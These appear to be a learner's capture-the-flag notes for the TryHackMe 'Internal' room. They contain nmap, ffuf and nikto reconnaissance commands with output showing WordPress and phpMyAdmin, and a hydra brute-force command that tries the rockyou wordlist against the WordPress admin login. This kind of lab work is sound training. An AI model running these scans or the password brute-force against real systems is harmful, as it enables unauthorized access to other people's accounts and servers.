### [https://tryhackme.com/room/internal](https://tryhackme.com/room/internal)
 
### nmap -vv -sS -Pn -oN 10.10.249.133_ports.nmap -p- 10.10.249.133

PORT STATE SERVICE REASON  
22/tcp open ssh syn-ack ttl 61  
80/tcp open http syn-ack ttl 61
 
### nmap -vv -sC -sV --script=vuln -oN 10.10.249.133_svcs.nmap -p 22,80 10.10.249.133

22/tcp open ssh syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 
80/tcp open http syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
| http-enum:  
| /blog/: Blog  
| /phpmyadmin/: phpMyAdmin  
| /wordpress/wp-login.php: Wordpress login page.  
|_ /blog/wp-login.php: Wordpress login page.  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
phpmyadmin 4.6.6deb5
 
# Web Enum

## ffuf directories

### ffuf -u [http://internal.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ](http://internal.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ) -c
 
internal.thm  
/blog  
/phpmyadmin  
/phpmyadmin/changelog.php  
/wordpress  
/javascript
 
## ffuf subdomains

### ffuf -u [http://FUZZ.internal.thm](http://FUZZ.internal.thm) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -fc 200
 
{none}
 
## nikto

### nikto -h 10.10.249.133 -o htm -o 10.10.249.133_nikto.html
 
+ /wordpress/: A Wordpress installation was found.  
+ /phpmyadmin/: phpMyAdmin directory found.  
+ /blog/wp-login.php: Wordpress login found.  
+ /wordpress/wp-login.php: Wordpress login found. --> /blog/wp-login.php
   

Mysql
 
EXPLOITS:  
Login page at [http://internal.thm/blog/wp-login.php](http://internal.thm/blog/wp-login.php) tells whether the username is correct
 
hydra -vV -t 4 -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:Error"
   

[http://internal.thm/blog/wp-login.php](http://internal.thm/blog/wp-login.php)